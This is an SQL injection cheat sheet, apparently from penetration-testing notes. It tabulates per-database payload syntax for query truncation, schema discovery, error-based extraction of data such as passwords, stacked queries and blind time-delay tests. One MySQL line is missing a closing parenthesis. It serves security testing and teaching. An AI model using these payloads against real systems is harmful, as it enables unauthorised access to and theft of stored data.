# SQLi Cheat sheet

{% embed url="https://pentestmonkey.net/category/cheat-sheet/sql-injection" %}

## SQL injection cheat sheet

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

### String concatenation <a href="#string-concatenation" id="string-concatenation"></a>

You can concatenate together multiple strings to make a single string.

| Oracle     | `'foo'\|\|'bar'`                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `'foo'+'bar'`                                                                                                    |
| PostgreSQL | `'foo'\|\|'bar'`                                                                                                 |
| MySQL      | <p><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code><br></p> |

### Substring <a href="#substring" id="substring"></a>

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### Comments <a href="#comments" id="comments"></a>

You can use comments to truncate a query and remove the portion of the original query that follows your input.

| Oracle     | <p><code>--comment</code><br></p>                                                                                          |
| ---------- | -------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| PostgreSQL | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| MySQL      | <p><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></p> |

### Database version <a href="#database-version" id="database-version"></a>

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Oracle     | <p><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code><br></p> |
| ---------- | --------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT @@version`                                                                                  |
| PostgreSQL | `SELECT version()`                                                                                  |
| MySQL      | `SELECT @@version`                                                                                  |

### Database contents <a href="#database-contents" id="database-contents"></a>

You can list the tables that exist in the database, and the columns that those tables contain.

| Oracle     | <p><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></p>                               |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |
| PostgreSQL | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |
| MySQL      | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |

### Conditional errors <a href="#conditional-errors" id="conditional-errors"></a>

You can test a single boolean condition and trigger a database error if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| ---------- | --------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Extracting data via visible error messages <a href="#extracting-data-via-visible-error-messages" id="extracting-data-via-visible-error-messages"></a>

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
| ---------- | --------------------------------------------------------------------------------------------------------------------------- |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`                     |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`               |

### Batched (or stacked) queries <a href="#batched-or-stacked-queries" id="batched-or-stacked-queries"></a>

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Oracle     | `Does not support batched queries.`                                                      |
| ---------- | ---------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>QUERY-1-HERE; QUERY-2-HERE</code><br><code>QUERY-1-HERE QUERY-2-HERE</code></p> |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                                                             |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                                                             |

**Note**

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

### Time delays <a href="#time-delays" id="time-delays"></a>

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

### Conditional time delays <a href="#conditional-time-delays" id="conditional-time-delays"></a>

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a'`                                                                    |
